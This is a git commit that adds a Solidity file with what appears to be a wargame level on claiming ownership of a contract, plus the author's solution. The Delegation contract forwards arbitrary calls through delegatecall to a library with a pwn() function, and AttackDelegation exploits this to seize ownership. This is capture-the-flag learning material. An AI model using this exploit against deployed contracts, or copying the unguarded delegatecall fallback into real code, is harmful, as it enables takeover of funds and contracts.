2f3b9b12a5280f44d4ba19c1f03ac1fc179a8fca
E-Zbox <zboxstudios97@gmail.com>
2023-08-07 10:42:37 +0100

    :

---
+++ contracts/Delegation.sol
@@ -0,0 +1,55 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+/**
+    The goal of this level is for you to claim ownership of the instance you are given.
+
+    Things that might help
+
+    Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
+    Fallback methods
+    Method ids
+*/
+
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress) {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result, ) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+
+contract AttackDelegation {
+    Delegation delegation;
+
+    function attack(address payable _delegation) public payable returns (bool) {
+        delegation = Delegation(_delegation);
+
+        (bool success, ) = address(delegation).call{value: msg.value}(
+            abi.encodeWithSignature("pwn()")
+        );
+
+        return success;
+    }
+}
